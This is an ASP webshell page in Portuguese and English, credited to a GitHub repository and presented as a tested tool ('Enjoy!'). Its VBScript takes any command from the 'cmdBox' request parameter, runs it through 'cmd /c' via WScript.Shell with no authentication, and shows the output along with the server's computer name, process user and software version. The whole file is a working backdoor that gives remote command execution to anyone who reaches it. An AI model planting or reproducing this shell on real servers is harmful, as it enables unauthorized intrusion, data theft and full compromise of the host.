<!--
A Simple ASP Webshell
Tested a lot !!
Enjoy!
https://github.com/ygorbittencourt/AspWebshell
-->

<%
Set ObjectNetwort = Server.CreateObject("WSCRIPT.NETWORK")

Function MyCmd(sn0wCm)
    Dim set1, set2
    Set set1 = CreateObject("WScript.Shell")
    Set set2 = set1.exec(sn0wCm)
    MyCmd = set2.StdOut.ReadAll
end Function
%>

<HTML>
<BODY>
    <pre>           d8888                         888       888          888               888               888 888</pre>
    <pre>          d88888                         888   o   888          888               888               888 888</pre>
        <pre>         d88P888                         888  d8b  888          888               888               888 888</pre>
            <pre>        d88P 888 .d8888b  88888b.        888 d888b 888  .d88b.  88888b.  .d8888b  88888b.   .d88b.  888 888</pre>
                <pre>       d88P  888 88K      888 "88b       888d88888b888 d8P  Y8b 888 "88b 88K      888 "88b d8P  Y8b 888 888</pre>
                    <pre>      d88P   888 "Y8888b. 888  888       88888P Y88888 88888888 888  888 "Y8888b. 888  888 88888888 888 888</pre>
                        <pre>     d8888888888      X88 888 d88P       8888P   Y8888 Y8b.     888 d88P      X88 888  888 Y8b.     888 888</pre>
                            <pre>    d88P     888  88888P' 88888P"        888P     Y888  "Y8888  88888P"   88888P' 888  888  "Y8888  888 888</pre>
                                <pre>                          888</pre>
                                    <pre>                          888</pre>
                                        <pre>                          888</pre>
                                        <pre></pre>
                                        <pre>       Enjoy!</pre>
                                        <a href="https://github.com/ygorbittencourt/AspWebshell">https://github.com/ygorbittencourt/AspWebshell </a>
                                        <pre></pre>
                                        <h3>        Insira o comando que deseja executar/Enter the command you want to run </h3>
<FORM action="" method="GET">
<input type="text" name="cmdBox" size=80 value="<%= Sn0wCmd %>">
<input type="submit" value="Executar/Run">
</FORM>
<PRE>
<p> 
<b>Nome do Computador:</b>
<%= ObjectNetwort.ComputerName %>

<b>Usuario do Processo da WebShell:</b>
<%= ObjectNetwort.UserName %>

<b>Versao do Servidor:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>

<b>Prompt de Retorno (Se esta em branco eh porque faltou voce digitar o comando ^/^ ):</b>
<% Sn0wCmd = request("cmdBox")
MyVar = MyCmd("cmd /c" & Sn0wCmd)
Response.Write(MyVar)%>
</p>
<br>
</BODY>
</HTML>
